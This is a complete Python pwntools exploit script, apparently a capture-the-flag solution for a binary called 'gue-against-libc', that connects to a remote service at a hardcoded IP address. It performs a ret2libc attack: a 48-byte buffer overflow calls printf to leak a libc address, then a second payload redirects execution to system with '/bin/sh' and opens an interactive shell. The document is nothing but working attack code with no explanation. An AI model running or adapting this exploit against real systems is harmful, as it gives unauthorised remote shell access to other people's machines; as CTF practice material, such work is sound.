from pwn import *
elf = ELF("./gue-against-libc")
r = elf.process()
r = remote("104.250.105.158",6008)
def main():
    offset = 48
    printf_libc = 0x0804c010
    printf_plt  = 0x08049050
    main = 0x080491cb
    p = "a" * offset
    p += p32(printf_plt)
    p += p32(main)
    p += p32(printf_libc)
    print r.recvuntil("\n")
    r.sendline(p)
    leak_printf = u32(r.recv(4))
    log.info("leak printf : " + hex(leak_printf))

    libc_base = leak_printf
    libc_system = libc_base + (-0xe6e0)
    libc_binsh = libc_base + 0x11000b
    p = "a" * offset
    p += p32(libc_system)
    p += "a" * 4
    p += p32(libc_binsh)
    print r.recvuntil("\n")
    r.sendline(p)
    r.interactive()


if __name__ == '__main__':
    main()
